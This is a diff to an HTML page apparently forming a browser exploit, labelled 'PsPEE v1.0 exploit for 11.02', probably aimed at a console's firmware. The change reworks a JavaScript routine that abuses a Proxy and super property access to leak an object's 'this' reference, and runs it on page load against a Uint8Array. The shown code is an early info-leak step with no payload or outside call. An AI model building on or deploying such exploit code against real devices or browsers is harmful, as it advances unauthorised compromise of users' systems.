@@ -27,28 +27,34 @@
 
         logToDiv("[INFO] PsPEE v1.0 exploit for 11.02.");
 
-        // Exploit 1: Leak JSScope object via Proxy + super
-        function leakJSScope() {
-            class Leaker {
+        // Exploit 1: Leak a JS object via Proxy + super.prop
+        function leakJSScope(obj) {
+            // Now extend Object so super.foo is legal
+            class Leaker extends Object {
                 leak() {
                     return super.foo;
                 }
             }
 
+            // Intercept property access to grab the real `this`
             Leaker.prototype.__proto__ = new Proxy({}, {
                 get(target, prop, receiver) {
-                    logToDiv("Leaked this: " + receiver); // Log to div
+                    logToDiv("[Leak] Receiver → " + receiver);
                     return 1;
                 }
             });
 
             const foo = 42;
             const { leak } = Leaker.prototype;
-            leak();
+            // Bind our target object as `this`
+            leak.call(obj);
         }
 
-        // Start the exploit
-        leakJSScope();
+        // Start the exploit on a typed array so we can see "[object Uint8Array]"
+        window.onload = function() {
+            logToDiv("[*] Attempting to leak a Uint8Array as `this`…");
+            leakJSScope(new Uint8Array(16));
+        };
     </script>
 </body>
 </html>
